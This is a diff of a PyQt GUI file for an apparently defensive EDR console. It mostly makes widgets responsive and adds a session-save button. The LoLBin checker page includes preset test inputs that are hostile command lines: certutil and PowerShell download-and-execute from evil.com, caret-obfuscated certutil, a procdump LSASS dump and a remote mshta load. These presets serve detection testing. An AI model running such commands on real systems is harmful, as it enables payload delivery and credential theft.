@@ -159,24 +159,30 @@ QTableWidget {{
     background: {THEME['surface']};
     color: {THEME['text']};
     border: 1px solid {THEME['border']};
-    gridline-color: {THEME['border']};
+    gridline-color: #2d333b;
     border-radius: 4px;
 }}
 QTableWidget::item {{
-    padding: 4px 8px;
-    border-bottom: 1px solid {THEME['border']};
+    padding: 5px 10px;
+    border-bottom: 1px solid #21262d;
+    border-right: 1px solid #21262d;
 }}
 QTableWidget::item:selected {{
     background: {THEME['blue_bg']};
     color: {THEME['text']};
 }}
 QHeaderView::section {{
-    background: {THEME['bg']};
+    background: #0d1117;
     color: {THEME['muted']};
-    padding: 5px 8px;
+    padding: 6px 10px;
     border: none;
-    border-bottom: 1px solid {THEME['border']};
+    border-bottom: 2px solid {THEME['border']};
+    border-right: 1px solid #21262d;
     font-size: 11px;
+    font-weight: bold;
+}}
+QHeaderView::section:last {{
+    border-right: none;
 }}
 QScrollBar:vertical {{
     background: {THEME['bg']};
@@ -296,7 +302,12 @@ class StatCard(QFrame):
     def __init__(self, label: str, color: str = None):
         super().__init__()
         self.color = color or THEME["blue"]
-        self.setFixedHeight(72)
+        self.setMinimumHeight(64)
+        self.setMinimumWidth(100)
+        self.setSizePolicy(
+            QSizePolicy.Policy.Expanding,
+            QSizePolicy.Policy.Preferred
+        )
         self.setStyleSheet(f"""
             QFrame {{
                 background: {THEME['surface']};
@@ -305,16 +316,17 @@ class StatCard(QFrame):
             }}
         """)
         layout = QVBoxLayout(self)
-        layout.setContentsMargins(14, 10, 14, 10)
+        layout.setContentsMargins(10, 8, 10, 8)
         layout.setSpacing(2)
 
         self.value_lbl = QLabel("—")
         self.value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.value_lbl.setFont(QFont("Consolas", 20, QFont.Weight.Bold))
+        self.value_lbl.setFont(QFont("Consolas", 18, QFont.Weight.Bold))
         self.value_lbl.setStyleSheet(f"color: {self.color}; border: none;")
 
         self.label_lbl = QLabel(label)
         self.label_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        self.label_lbl.setWordWrap(True)
         self.label_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")
 
         layout.addWidget(self.value_lbl)
@@ -520,22 +532,42 @@ def verdict_color(v: str) -> str:
     return THEME["muted"]
 
 def make_table(headers: list, stretch_col: int = -1) -> QTableWidget:
-    """stretch_col: index of column to stretch; others resize to contents.
-    Pass -1 (default) to stretch the last column."""
+    """
+    Creates a styled, responsive QTableWidget.
+
+    stretch_col: index of the column that fills remaining space.
+                 All other columns resize to their content.
+                 Pass -1 (default) to stretch the last column.
+
+    Responsive behaviour:
+      - Stretch column expands to fill available width
+      - Content columns shrink/grow with content
+      - Horizontal scrollbar appears when total content exceeds width
+      - Interactive resize handles allow manual column adjustment
+    """
     t = QTableWidget(0, len(headers))
     t.setHorizontalHeaderLabels(headers)
     hdr = t.horizontalHeader()
-    last = len(headers) - 1
+    hdr.setStretchLastSection(False)    # We manage this manually below
+    last   = len(headers) - 1
     target = stretch_col if stretch_col >= 0 else last
     for i in range(len(headers)):
         if i == target:
             hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.Stretch)
         else:
-            hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.ResizeToContents)
+            hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.Interactive)
+            hdr.setMinimumSectionSize(60)
+    # Apply initial ResizeToContents then switch to Interactive for user control
+    t.resizeColumnsToContents()
     t.verticalHeader().setVisible(False)
     t.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
     t.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
     t.setAlternatingRowColors(False)
+    t.setShowGrid(True)
+    t.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
+    t.setWordWrap(False)
+    # Show resize cursor on column dividers so the user knows they are draggable
+    t.horizontalHeader().setCursor(Qt.CursorShape.SizeHorCursor)
     return t
 
 def table_item(text: str, color: str = None) -> QTableWidgetItem:
@@ -560,7 +592,7 @@ class CyberSentinelGUI(QMainWindow):
         super().__init__()
         self._run_on_main_signal.connect(lambda fn: fn())
         self.setWindowTitle("CyberSentinel v2 — EDR Console")
-        self.setMinimumSize(1200, 760)
+        self.setMinimumSize(900, 600)
         self.setStyleSheet(BASE_STYLE)
         self._workers = []   # keep references so GC doesn't destroy threads
 
@@ -643,7 +675,12 @@ class CyberSentinelGUI(QMainWindow):
 
     def _build_sidebar(self):
         sidebar = QFrame()
-        sidebar.setFixedWidth(200)
+        sidebar.setMinimumWidth(170)
+        sidebar.setMaximumWidth(220)
+        sidebar.setSizePolicy(
+            QSizePolicy.Policy.Fixed,
+            QSizePolicy.Policy.Expanding
+        )
         sidebar.setStyleSheet(f"""
             QFrame {{
                 background: {THEME['surface']};
@@ -817,27 +854,38 @@ class CyberSentinelGUI(QMainWindow):
             }}
         """)
         h = QHBoxLayout(frame)
-        h.setContentsMargins(24, 16, 24, 16)
+        h.setContentsMargins(24, 14, 24, 14)
         h.setSpacing(12)
 
         icon_lbl = QLabel(icon)
         icon_lbl.setFont(QFont("Segoe UI Emoji", 20))
         icon_lbl.setStyleSheet("border: none;")
+        icon_lbl.setSizePolicy(
+            QSizePolicy.Policy.Fixed,
+            QSizePolicy.Policy.Preferred
+        )
 
         txt = QVBoxLayout()
         txt.setSpacing(2)
         t = QLabel(title)
         t.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
         t.setStyleSheet(f"color: {THEME['blue']}; border: none;")
+
         s = QLabel(subtitle)
         s.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")
+        s.setWordWrap(True)     # Prevents subtitle from being clipped on narrow windows
+        s.setSizePolicy(
+            QSizePolicy.Policy.Expanding,
+            QSizePolicy.Policy.Preferred
+        )
+
         txt.addWidget(t)
         txt.addWidget(s)
 
         h.addWidget(icon_lbl)
-        h.addLayout(txt)
-        h.addStretch()
-        frame.setFixedHeight(68)
+        h.addLayout(txt, 1)    # Give text column stretch factor so it fills available width
+        # Remove fixed height — let content determine height so subtitles never clip
+        frame.setMinimumHeight(60)
         return frame
 
     # ── PAGE: CONSOLE PANE HELPER ─────────────────────────────────────────────
@@ -892,7 +940,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         refresh_btn = QPushButton("↻  Refresh Now")
         refresh_btn.setObjectName("primary")
-        refresh_btn.setFixedWidth(140)
+        refresh_btn.setMinimumWidth(140)
         refresh_btn.clicked.connect(self._refresh_dashboard)
         btn_row.addWidget(refresh_btn)
         btn_row.addStretch()
@@ -965,10 +1013,10 @@ class CyberSentinelGUI(QMainWindow):
         self._scan_path = QLineEdit()
         self._scan_path.setPlaceholderText("Enter file or folder path, or click Browse…")
         browse_btn = QPushButton("📂  Browse")
-        browse_btn.setFixedWidth(110)
+        browse_btn.setMinimumWidth(110)
         browse_btn.clicked.connect(self._browse_scan_file)
         browse_dir_btn = QPushButton("📁  Folder")
-        browse_dir_btn.setFixedWidth(90)
+        browse_dir_btn.setMinimumWidth(90)
         browse_dir_btn.clicked.connect(self._browse_scan_dir)
         path_layout.addWidget(self._scan_path)
         path_layout.addWidget(browse_btn)
@@ -993,14 +1041,26 @@ class CyberSentinelGUI(QMainWindow):
 
         self._scan_file_btn = QPushButton("  ▶  Run Scan")
         self._scan_file_btn.setObjectName("primary")
-        self._scan_file_btn.setFixedWidth(130)
+        self._scan_file_btn.setMinimumWidth(130)
         self._scan_file_btn.clicked.connect(self._run_scan_file)
         opts_row.addWidget(self._scan_file_btn)
 
         clear_btn = QPushButton("🗑  Clear")
-        clear_btn.setFixedWidth(80)
+        clear_btn.setMinimumWidth(80)
         clear_btn.clicked.connect(lambda: self._scan_console.clear_console())
         opts_row.addWidget(clear_btn)
+
+        self._scan_save_btn = QPushButton("💾  Save Session")
+        self._scan_save_btn.setMinimumWidth(120)
+        self._scan_save_btn.setEnabled(False)
+        self._scan_save_btn.setToolTip(
+            "Save the current scan session to a .txt report file in Analysis Files\\"
+        )
+        self._scan_save_btn.clicked.connect(
+            lambda: self.logic.save_session_log() if self.logic.session_log else None
+        )
+        opts_row.addWidget(self._scan_save_btn)
+
         inner_layout.addLayout(opts_row)
 
         # Progress
@@ -1041,6 +1101,7 @@ class CyberSentinelGUI(QMainWindow):
         self._scan_console.append_line(f"[*] Starting scan: {target}", THEME["blue"])
         self._scan_progress.setVisible(True)
         self._scan_file_btn.setEnabled(False)
+        self._scan_save_btn.setEnabled(False)
 
         worker = ScanWorker(self.logic, target)
         worker.line_out.connect(self._scan_console.append_line)
@@ -1127,7 +1188,7 @@ class CyberSentinelGUI(QMainWindow):
                 ]:
                     row = QHBoxLayout()
                     lbl = QLabel(f"{label}:")
-                    lbl.setFixedWidth(60)
+                    lbl.setMinimumWidth(60)
                     lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 11px; border: none;")
                     val = QLabel(value)
                     val.setStyleSheet(f"color: {color}; font-size: 11px; border: none;")
@@ -1157,7 +1218,7 @@ class CyberSentinelGUI(QMainWindow):
                 notes_row = QHBoxLayout()
                 notes_lbl = QLabel("Notes:")
                 notes_lbl.setStyleSheet(f"color: {THEME['text']}; border: none;")
-                notes_lbl.setFixedWidth(60)
+                notes_lbl.setMinimumWidth(60)
                 notes_input = QLineEdit()
                 notes_input.setPlaceholderText(
                     "Required for FP/FN — explain why the verdict is wrong"
@@ -1181,9 +1242,9 @@ class CyberSentinelGUI(QMainWindow):
                 btn_row = QHBoxLayout()
                 submit_btn = QPushButton("✔  Submit Review")
                 submit_btn.setObjectName("primary")
-                submit_btn.setFixedWidth(150)
+                submit_btn.setMinimumWidth(150)
                 skip_btn   = QPushButton("Skip")
-                skip_btn.setFixedWidth(80)
+                skip_btn.setMinimumWidth(80)
                 btn_row.addStretch()
                 btn_row.addWidget(submit_btn)
                 btn_row.addWidget(skip_btn)
@@ -1316,7 +1377,7 @@ class CyberSentinelGUI(QMainWindow):
             layout.addWidget(text)
 
             close_btn = QPushButton("Close")
-            close_btn.setFixedWidth(100)
+            close_btn.setMinimumWidth(100)
             close_btn.clicked.connect(dlg.accept)
             layout.addWidget(close_btn, alignment=Qt.AlignmentFlag.AlignRight)
 
@@ -1333,9 +1394,13 @@ class CyberSentinelGUI(QMainWindow):
     def _scan_done(self, ok: bool):
         self._scan_progress.setVisible(False)
         self._scan_file_btn.setEnabled(True)
+        self._scan_save_btn.setEnabled(True)
         msg = "[+] Scan complete." if ok else "[-] Scan ended with errors."
         self._scan_console.append_line(msg, THEME["green"] if ok else THEME["red"])
         self._refresh_dashboard()
+        # Ask analyst if they want to save the session report
+        if ok and self.logic.session_log:
+            self.logic.save_session_log()
 
     # ── PAGE: SCAN HASH ───────────────────────────────────────────────────────
 
@@ -1364,7 +1429,7 @@ class CyberSentinelGUI(QMainWindow):
         single_row.addWidget(self._hash_input)
         scan_hash_btn = QPushButton("▶  Scan")
         scan_hash_btn.setObjectName("primary")
-        scan_hash_btn.setFixedWidth(80)
+        scan_hash_btn.setMinimumWidth(80)
         scan_hash_btn.clicked.connect(self._run_hash_scan)
         single_row.addWidget(scan_hash_btn)
         grp_layout.addLayout(single_row)
@@ -1373,11 +1438,11 @@ class CyberSentinelGUI(QMainWindow):
         self._ioc_path = QLineEdit()
         self._ioc_path.setPlaceholderText("Or load a .txt file with one hash per line…")
         browse_ioc_btn = QPushButton("📂  Load .txt")
-        browse_ioc_btn.setFixedWidth(100)
+        browse_ioc_btn.setMinimumWidth(100)
         browse_ioc_btn.clicked.connect(self._browse_ioc)
         scan_batch_btn = QPushButton("▶  Batch Scan")
         scan_batch_btn.setObjectName("primary")
-        scan_batch_btn.setFixedWidth(110)
+        scan_batch_btn.setMinimumWidth(110)
         scan_batch_btn.clicked.connect(self._run_batch_scan)
         batch_row.addWidget(self._ioc_path)
         batch_row.addWidget(browse_ioc_btn)
@@ -1459,13 +1524,13 @@ class CyberSentinelGUI(QMainWindow):
         # Button row
         btn_row = QHBoxLayout()
         enum_btn = QPushButton("📋  Enumerate Processes")
-        enum_btn.setFixedWidth(190)
+        enum_btn.setMinimumWidth(190)
         enum_btn.clicked.connect(self._enumerate_processes)
         btn_row.addWidget(enum_btn)
 
         self._edr_scan_btn = QPushButton("⚡  Scan Selected Process")
         self._edr_scan_btn.setObjectName("primary")
-        self._edr_scan_btn.setFixedWidth(190)
+        self._edr_scan_btn.setMinimumWidth(190)
         self._edr_scan_btn.setEnabled(False)
         self._edr_scan_btn.clicked.connect(self._scan_selected_process)
         btn_row.addWidget(self._edr_scan_btn)
@@ -1599,7 +1664,8 @@ class CyberSentinelGUI(QMainWindow):
         layout.setSpacing(0)
         layout.addWidget(self._page_header(
             "🪝", "LoLBin Abuse Checker",
-            "Detect Living-off-the-Land binary abuse via command-line pattern matching"
+            "5-layer detection: pattern matching + path normalization + "
+            "argument de-obfuscation + entropy analysis + parent process context"
         ))
 
         inner = QWidget()
@@ -1612,63 +1678,122 @@ class CyberSentinelGUI(QMainWindow):
         form.setSpacing(10)
 
         self._lolbas_name = QLineEdit()
-        self._lolbas_name.setPlaceholderText("e.g. certutil.exe, mshta.exe, powershell.exe")
+        self._lolbas_name.setPlaceholderText("e.g. certutil.exe  or  C:\\Windows\\System32\\certutil.exe")
+
         self._lolbas_cmd = QLineEdit()
-        self._lolbas_cmd.setPlaceholderText("e.g. certutil.exe -urlcache -split -f http://evil.com/payload.exe")
+        self._lolbas_cmd.setPlaceholderText(
+            "e.g. certutil.exe -urlcache -split -f http://evil.com/payload.exe"
+        )
         self._lolbas_cmd.returnPressed.connect(self._run_lolbas)
 
-        form.addRow(QLabel("Process Name:"), self._lolbas_name)
-        form.addRow(QLabel("Full Command Line:"), self._lolbas_cmd)
+        self._lolbas_parent = QLineEdit()
+        self._lolbas_parent.setPlaceholderText(
+            "Optional — e.g. winword.exe, explorer.exe, svchost.exe"
+        )
+
+        form.addRow(QLabel("Process Name / Path:"), self._lolbas_name)
+        form.addRow(QLabel("Full Command Line:"),    self._lolbas_cmd)
+        form.addRow(QLabel("Parent Process:"),       self._lolbas_parent)
         inner_layout.addWidget(form_grp)
 
         btn_row = QHBoxLayout()
         check_btn = QPushButton("🔎  Check for Abuse")
         check_btn.setObjectName("primary")
-        check_btn.setFixedWidth(160)
+        check_btn.setMinimumWidth(160)
         check_btn.clicked.connect(self._run_lolbas)
         btn_row.addWidget(check_btn)
 
-        # Quick examples
+        # Quick examples including obfuscation test cases
         examples = [
-            ("certutil download", "certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/p.exe C:\\tmp\\p.exe"),
-            ("PowerShell -enc",   "powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgA"),
-            ("ProcDump LSASS",    "procdump.exe",   "procdump.exe -ma lsass.exe C:\\tmp\\lsass.dmp"),
-            ("mshta remote",      "mshta.exe",      "mshta.exe https://evil.com/script.hta"),
+            ("certutil download",    "certutil.exe",    "certutil.exe -urlcache -split -f http://evil.com/p.exe C:\\tmp\\p.exe",         ""),
+            ("PowerShell -enc",      "powershell.exe",  "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",  ""),
+            ("Caret obfuscation",    "certutil.exe",    "cer^tu^til.exe -ur^lc^ac^he -f http://evil.com/p.exe",                          ""),
+            ("ProcDump LSASS",       "procdump.exe",    "procdump.exe -ma lsass.exe C:\\tmp\\lsass.dmp",                                  ""),
+            ("mshta remote",         "mshta.exe",       "mshta.exe https://evil.com/script.hta",                                          ""),
+            ("Office spawns PS",     "powershell.exe",  "powershell.exe -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",
+                                                                                                                                           "winword.exe"),
         ]
-        for label, name, cmd in examples:
+        for label, name, cmd, parent in examples:
             eb = QPushButton(f"▸ {label}")
-            eb.setFixedWidth(130)
-            eb.clicked.connect(lambda _, n=name, c=cmd: (
+            eb.setMinimumWidth(120)
+            eb.clicked.connect(lambda _, n=name, c=cmd, p=parent: (
                 self._lolbas_name.setText(n),
                 self._lolbas_cmd.setText(c),
+                self._lolbas_parent.setText(p),
             ))
             btn_row.addWidget(eb)
         btn_row.addStretch()
         inner_layout.addLayout(btn_row)
 
         self._lolbas_console = ConsoleWidget()
-        self._lolbas_console.append_line("● Enter a process name + command line and click Check.", THEME["muted"])
+        self._lolbas_console.append_line(
+            "● Enter a process name + command line and click Check for Abuse.\n"
+            "  The checker now normalizes obfuscation before matching and scores confidence\n"
+            "  based on detection source and parent process context.",
+            THEME["muted"]
+        )
         inner_layout.addWidget(self._lolbas_console, 1)
 
         layout.addWidget(inner, 1)
         return page
 
     def _run_lolbas(self):
-        name = self._lolbas_name.text().strip()
-        cmd  = self._lolbas_cmd.text().strip()
+        name   = self._lolbas_name.text().strip()
+        cmd    = self._lolbas_cmd.text().strip()
+        parent = self._lolbas_parent.text().strip()
         if not name:
+            self._lolbas_console.append_line("⚠ Enter a process name first.", THEME["yellow"])
             return
         self._lolbas_console.clear_console()
         self._lolbas_console.append_line(f"[*] Checking: {name}", THEME["blue"])
-        hit = self.lolbas.check_process(name, cmd)
+        if parent:
+            self._lolbas_console.append_line(f"[*] Parent context: {parent}", THEME["muted"])
+
+        hit = self.lolbas.check_process(
+            name,
+            cmd,
+            from_daemon = False,
+            parent_name = parent,
+            exe_path    = name if os.sep in name or "/" in name else "",
+        )
         if hit:
+            confidence = hit.get("confidence", "MEDIUM")
+            color = {
+                "HIGH":   THEME["red"],
+                "MEDIUM": THEME["yellow"],
+                "LOW":    THEME["blue"],
+            }.get(confidence, THEME["yellow"])
+
+            self._lolbas_console.append_line(
+                f"[!] LOLBIN ABUSE DETECTED — {confidence} CONFIDENCE",
+                color
+            )
             alert = self.lolbas.format_alert(hit)
             for line in alert.splitlines():
                 self._lolbas_console.append_line(line)
+
+            # Show normalization result if obfuscation was stripped
+            normalized = hit.get("cmdline_normalized", "")
+            if normalized and normalized != cmd:
+                self._lolbas_console.append_line("", THEME["muted"])
+                self._lolbas_console.append_line(
+                    "ℹ  Obfuscation detected and stripped before matching:",
+                    THEME["blue"]
+                )
+                self._lolbas_console.append_line(f"  Original   : {cmd[:100]}", THEME["muted"])
+                self._lolbas_console.append_line(f"  Normalized : {normalized[:100]}", THEME["green"])
         else:
             self._lolbas_console.append_line(
-                f"[+] No known LoLBin abuse pattern matched for '{name}'.", THEME["green"]
+                f"[+] No LoLBin abuse pattern matched for '{name}'.", THEME["green"]
             )
+            # Still show if obfuscation was stripped even on clean result
+            from modules.lolbas_detector import _normalize_cmdline
+            normalized = _normalize_cmdline(cmd)
+            if normalized != cmd:
+                self._lolbas_console.append_line(
+                    f"[*] Note: Obfuscation was detected and stripped — "
+                    f"normalized command was also checked.", THEME["muted"]
+                )
 
     # ── PAGE: BYOVD ───────────────────────────────────────────────────────────
 
@@ -1694,7 +1819,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         scan_btn = QPushButton("💀  Scan Loaded Drivers")
         scan_btn.setObjectName("primary")
-        scan_btn.setFixedWidth(180)
+        scan_btn.setMinimumWidth(180)
         scan_btn.clicked.connect(self._run_byovd)
         btn_row.addWidget(scan_btn)
         btn_row.addStretch()
@@ -1766,7 +1891,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         run_btn = QPushButton("🔗  Run Correlation Sweep")
         run_btn.setObjectName("primary")
-        run_btn.setFixedWidth(200)
+        run_btn.setMinimumWidth(200)
         run_btn.clicked.connect(self._refresh_chains)
         btn_row.addWidget(run_btn)
         btn_row.addStretch()
@@ -1774,7 +1899,15 @@ class CyberSentinelGUI(QMainWindow):
 
         grp = QGroupBox("Detected Attack Chains")
         grp_layout = QVBoxLayout(grp)
-        self._chains_table = make_table(["Timestamp", "Chain", "MITRE", "Severity", "Description"])
+        self._chains_table = make_table(
+            ["Timestamp", "Chain", "MITRE", "Severity", "Description"],
+            stretch_col=4    # Description gets all remaining space
+        )
+        # Set comfortable initial widths for fixed columns
+        self._chains_table.setColumnWidth(0, 155)   # Timestamp
+        self._chains_table.setColumnWidth(1, 180)   # Chain name
+        self._chains_table.setColumnWidth(2, 130)   # MITRE
+        self._chains_table.setColumnWidth(3, 90)    # Severity
         grp_layout.addWidget(self._chains_table)
         inner_layout.addWidget(grp, 1)
 
@@ -1832,20 +1965,20 @@ class CyberSentinelGUI(QMainWindow):
         self._baseline_hours = QSpinBox()
         self._baseline_hours.setRange(1, 168)
         self._baseline_hours.setValue(24)
-        self._baseline_hours.setFixedWidth(80)
+        self._baseline_hours.setMinimumWidth(80)
 
         start_btn = QPushButton("▶  Start Learning")
         start_btn.setObjectName("success")
-        start_btn.setFixedWidth(140)
+        start_btn.setMinimumWidth(140)
         start_btn.clicked.connect(self._start_baseline)
 
         stop_btn = QPushButton("■  Stop & Save")
         stop_btn.setObjectName("danger")
-        stop_btn.setFixedWidth(120)
+        stop_btn.setMinimumWidth(120)
         stop_btn.clicked.connect(self._stop_baseline)
 
         stats_btn = QPushButton("📊  Show Stats")
-        stats_btn.setFixedWidth(110)
+        stats_btn.setMinimumWidth(110)
         stats_btn.clicked.connect(self._show_baseline_stats)
 
         ctrl_layout.addWidget(dur_label)
@@ -1915,7 +2048,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         refresh_btn = QPushButton("↻  Refresh Alerts")
         refresh_btn.setObjectName("primary")
-        refresh_btn.setFixedWidth(150)
+        refresh_btn.setMinimumWidth(150)
         refresh_btn.clicked.connect(self._refresh_fileless)
         btn_row.addWidget(refresh_btn)
         btn_row.addStretch()
@@ -2061,11 +2194,11 @@ class CyberSentinelGUI(QMainWindow):
 
         btn_row = QHBoxLayout()
         check_btn = QPushButton("↻  Check Status")
-        check_btn.setFixedWidth(130)
+        check_btn.setMinimumWidth(130)
         check_btn.clicked.connect(self._check_intel_status)
         update_btn = QPushButton("⬇  Update All Feeds")
         update_btn.setObjectName("primary")
-        update_btn.setFixedWidth(160)
+        update_btn.setMinimumWidth(160)
         update_btn.clicked.connect(self._run_intel_update)
         btn_row.addWidget(check_btn)
         btn_row.addWidget(update_btn)
@@ -2151,7 +2284,7 @@ class CyberSentinelGUI(QMainWindow):
             row_layout = QHBoxLayout()
             row_layout.addWidget(le)
             toggle = QPushButton("Show")
-            toggle.setFixedWidth(48)
+            toggle.setMinimumWidth(48)
             toggle.setFixedHeight(28)
             toggle.setCheckable(True)
             toggle.setStyleSheet(f"""
@@ -2186,7 +2319,7 @@ class CyberSentinelGUI(QMainWindow):
         self._webhook_field.setPlaceholderText("https://discord.com/api/webhooks/… or Slack/Teams URL")
         self._webhook_field.setText(self.logic.webhook_url or "")
         test_wh_btn = QPushButton("🔔  Test")
-        test_wh_btn.setFixedWidth(80)
+        test_wh_btn.setMinimumWidth(80)
         test_wh_btn.clicked.connect(self._test_webhook)
         wh_layout.addWidget(self._webhook_field)
         wh_layout.addWidget(test_wh_btn)
@@ -2195,7 +2328,7 @@ class CyberSentinelGUI(QMainWindow):
         # Save
         save_btn = QPushButton("💾  Save Configuration")
         save_btn.setObjectName("primary")
-        save_btn.setFixedWidth(180)
+        save_btn.setMinimumWidth(180)
         save_btn.clicked.connect(self._save_settings)
         inner_layout.addWidget(save_btn)
 
@@ -2264,7 +2397,7 @@ class CyberSentinelGUI(QMainWindow):
             "samples/ root (with pre2020/post2020/stealth subdirs) — leave blank for flat layout"
         )
         samples_browse = QPushButton("📁")
-        samples_browse.setFixedWidth(36)
+        samples_browse.setMinimumWidth(36)
         samples_browse.clicked.connect(lambda: self._eval_browse(self._eval_samples))
         samples_row.addWidget(self._eval_samples)
         samples_row.addWidget(samples_browse)
@@ -2275,7 +2408,7 @@ class CyberSentinelGUI(QMainWindow):
         self._eval_malware = QLineEdit()
         self._eval_malware.setPlaceholderText("Flat layout — malware directory")
         mal_browse = QPushButton("📁")
-        mal_browse.setFixedWidth(36)
+        mal_browse.setMinimumWidth(36)
         mal_browse.clicked.connect(lambda: self._eval_browse(self._eval_malware))
         mal_row.addWidget(self._eval_malware)
         mal_row.addWidget(mal_browse)
@@ -2285,7 +2418,7 @@ class CyberSentinelGUI(QMainWindow):
         self._eval_clean = QLineEdit()
         self._eval_clean.setPlaceholderText("Flat layout — clean/benign directory")
         clean_browse = QPushButton("📁")
-        clean_browse.setFixedWidth(36)
+        clean_browse.setMinimumWidth(36)
         clean_browse.clicked.connect(lambda: self._eval_browse(self._eval_clean))
         clean_row.addWidget(self._eval_clean)
         clean_row.addWidget(clean_browse)
@@ -2296,12 +2429,12 @@ class CyberSentinelGUI(QMainWindow):
         opts_row = QHBoxLayout()
         self._eval_tier1_chk = QPushButton("☁  Include Tier 1 Cloud")
         self._eval_tier1_chk.setCheckable(True)
-        self._eval_tier1_chk.setFixedWidth(180)
+        self._eval_tier1_chk.setMinimumWidth(180)
         self._eval_resume_chk = QPushButton("↺  Resume Mode")
         self._eval_resume_chk.setCheckable(True)
-        self._eval_resume_chk.setFixedWidth(130)
+        self._eval_resume_chk.setMinimumWidth(130)
         self._eval_metrics_btn = QPushButton("📊  Metrics Only (no rescan)")
-        self._eval_metrics_btn.setFixedWidth(210)
+        self._eval_metrics_btn.setMinimumWidth(210)
         self._eval_metrics_btn.clicked.connect(self._run_metrics_only)
         opts_row.addWidget(self._eval_tier1_chk)
         opts_row.addWidget(self._eval_resume_chk)
@@ -2310,7 +2443,7 @@ class CyberSentinelGUI(QMainWindow):
 
         self._eval_run_btn = QPushButton("▶  Run Evaluation")
         self._eval_run_btn.setObjectName("primary")
-        self._eval_run_btn.setFixedWidth(160)
+        self._eval_run_btn.setMinimumWidth(160)
         self._eval_run_btn.clicked.connect(self._run_evaluation)
         opts_row.addWidget(self._eval_run_btn)
         il.addLayout(opts_row)
@@ -2576,7 +2709,7 @@ class CyberSentinelGUI(QMainWindow):
         self._fb_notes_input.setPlaceholderText("Reason / notes (required for FP/FN)...")
         self._fb_submit_btn = QPushButton("\u2714  Submit Feedback")
         self._fb_submit_btn.setObjectName("primary")
-        self._fb_submit_btn.setFixedWidth(160)
+        self._fb_submit_btn.setMinimumWidth(160)
         self._fb_submit_btn.clicked.connect(self._submit_feedback)
         row3.addWidget(QLabel("Notes:"))
         row3.addWidget(self._fb_notes_input, 1)
@@ -2606,13 +2739,13 @@ class CyberSentinelGUI(QMainWindow):
 
         btn_row = QHBoxLayout()
         refresh_btn = QPushButton("\u21bb  Refresh")
-        refresh_btn.setFixedWidth(90)
+        refresh_btn.setMinimumWidth(90)
         refresh_btn.clicked.connect(self._refresh_feedback_table)
         review_btn = QPushButton("\u270e  Review Selected")
-        review_btn.setFixedWidth(140)
+        review_btn.setMinimumWidth(140)
         review_btn.clicked.connect(self._prefill_from_selection)
         export_btn = QPushButton("\U0001f4c4  Export CSV")
-        export_btn.setFixedWidth(110)
+        export_btn.setMinimumWidth(110)
         export_btn.clicked.connect(self._export_feedback_csv)
         btn_row.addWidget(refresh_btn)
         btn_row.addWidget(review_btn)
@@ -2866,20 +2999,20 @@ class CyberSentinelGUI(QMainWindow):
         self._al_threshold.setToolTip(
             "Validated (PENDING) corrections needed to trigger automatic retraining."
         )
-        self._al_threshold.setFixedWidth(70)
+        self._al_threshold.setMinimumWidth(70)
 
         retrain_btn = QPushButton("🧠  Retrain Now")
         retrain_btn.setObjectName("primary")
-        retrain_btn.setFixedWidth(140)
+        retrain_btn.setMinimumWidth(140)
         retrain_btn.clicked.connect(self._force_retrain)
 
         refresh_btn = QPushButton("↻  Refresh")
-        refresh_btn.setFixedWidth(90)
+        refresh_btn.setMinimumWidth(90)
         refresh_btn.clicked.connect(self._refresh_adaptive)
 
         clear_btn = QPushButton("🗑  Clear Queue")
         clear_btn.setObjectName("danger")
-        clear_btn.setFixedWidth(120)
+        clear_btn.setMinimumWidth(120)
         clear_btn.clicked.connect(self._clear_learning_queue)
 
         ctrl_layout.addWidget(thresh_lbl)
@@ -2929,11 +3062,11 @@ class CyberSentinelGUI(QMainWindow):
         conflict_btn_row = QHBoxLayout()
         approve_btn = QPushButton("✓  Approve Selected")
         approve_btn.setObjectName("success")
-        approve_btn.setFixedWidth(160)
+        approve_btn.setMinimumWidth(160)
         approve_btn.clicked.connect(self._approve_selected_conflict)
         reject_btn = QPushButton("✗  Reject Selected")
         reject_btn.setObjectName("danger")
-        reject_btn.setFixedWidth(150)
+        reject_btn.setMinimumWidth(150)
         reject_btn.clicked.connect(self._reject_selected_conflict)
         conflict_btn_row.addWidget(approve_btn)
         conflict_btn_row.addWidget(reject_btn)
@@ -2955,7 +3088,7 @@ class CyberSentinelGUI(QMainWindow):
         revoke_row = QHBoxLayout()
         revoke_btn = QPushButton("↩  Revoke Selected")
         revoke_btn.setObjectName("danger")
-        revoke_btn.setFixedWidth(160)
+        revoke_btn.setMinimumWidth(160)
         revoke_btn.setToolTip(
             "Revoke a PENDING correction before it trains.\n"
             "If already TRAINED, the model is automatically rolled back."
@@ -3005,7 +3138,6 @@ class CyberSentinelGUI(QMainWindow):
             learner.threshold = self._al_threshold.value()
 
             summary = learner.get_queue_summary()
-            # Combine FP and FN pending into one card
             pending_total = summary.get("pending_fp", 0) + summary.get("pending_fn", 0)
             self._al_cards["pending_fp"].set_value(pending_total)
             for key in ("pending_review", "conflicted", "trained", "revoked"):
@@ -3019,20 +3151,47 @@ class CyberSentinelGUI(QMainWindow):
             anchor_stats = learner.get_anchor_stats()
             for key, card in self._anchor_cards.items():
                 card.set_value(anchor_stats.get(key, 0))
-            if anchor_stats.get("balanced"):
-                self._anchor_balance_lbl.setText("✓ Anchor store is balanced")
+
+            # Ready-to-train status with detailed guidance
+            ready        = anchor_stats.get("ready_to_train", False)
